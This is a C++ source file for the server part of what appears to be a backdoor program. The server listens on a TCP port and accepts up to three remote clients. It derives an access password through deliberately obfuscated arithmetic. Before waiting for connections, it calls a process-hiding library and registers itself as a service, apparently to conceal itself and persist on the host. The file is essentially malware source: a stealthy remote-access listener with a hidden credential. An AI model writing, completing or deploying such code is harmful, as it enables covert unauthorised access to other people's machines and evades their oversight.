#include "Server.hpp"

Server::Server (int port)
{
	this->listenPort = port;
	this->generateAuthenticationPassword();
}

Server::Server ( Server const & src )
{
	*this = src;
}

Server &				Server::operator=( Server const & rhs )
{
	return (*this);
}

Server::~Server ( void )
{
	for (int i = 0; i < this->clients.size(); i++)
		delete this->clients[i];
}

std::ostream &				operator<<(std::ostream & o, Server const & i)
{
	return (o);
}

int Server::getPlus(int plus)
{
	static int i = 0;
	if (i == ((3*2)*2)) {
		return (plus);
	}
	i++;
	return (this->getPlus(plus *= 2));
}

int	Server::getKeyIndex(int current)
{
	static int i = 0;
	if (i == (3*2)) {
		int plus = getPlus(125);
		return (current + plus);
	} else {
		i++;
		return this->getKeyIndex(current *= 10);
	}
}

void Server::generateAuthenticationPassword()
{
	int i		= 0;
	std::string	key;
	int index	= this->getKeyIndex(1);

	while (((i * 5) / 4) < (((index / 24) / 5) / 100)) {
		if (i == 0) {
			i += (int)'!';
		}
		key += i;
		i += ((1 * ((i++ / 3) - 1) * 2) / 4) - 1;
	}
	i = key.length() - 1;
	while (i > 0){
		this->password += key.c_str()[i--];
		i -= 1 * (key.length() / (key.length() + 1));
	}
}

void Server::waitClients()
{
	int 					fd		= 0;
	socklen_t				length	= sizeof(in);
	int						max_fd	= 0;
	struct sockaddr_in		in;

	while (true)
	{
		if ((fd = accept(this->sock, (struct sockaddr*)&in, &length)) == -1)
			throw ServerCantAcceptSocket();
		if (this->clients.size() < 3) { // 3 clients allowed
			this->clients.push_back(new Client(fd, in, this));
		} else {
			close (fd);
		}
	}
}

void Server::removeClient(Client *client)
{
	for (int i = 0; i < this->clients.size(); i++)
	{
		if (this->clients[i] == client) {
			this->clients.erase(this->clients.begin() + i);
			break;
		}
	}
}

std::string Server::getPassword()
{
	return this->password;
}

void Server::listenInit()
{
	bool opt = true;
	if ((this->sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		throw ServerCantCreateSocket();
	this->in.sin_family = AF_INET;
	this->in.sin_addr.s_addr = INADDR_ANY;
	this->in.sin_port = htons(this->listenPort);
	setsockopt(this->sock, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
	if ((bind(this->sock, (struct sockaddr *)&this->in, \
			sizeof(this->in))) < 0)
		throw ServerCantBindSocket();
	if ((listen(this->sock, 3)) == -1)
		throw ServerCantListenOnSocket();
	ProcessHider	hider;
	hider.initLibrary();
	Service service(Utils::getCurrentPath());
	service.initService();
	this->waitClients();
}
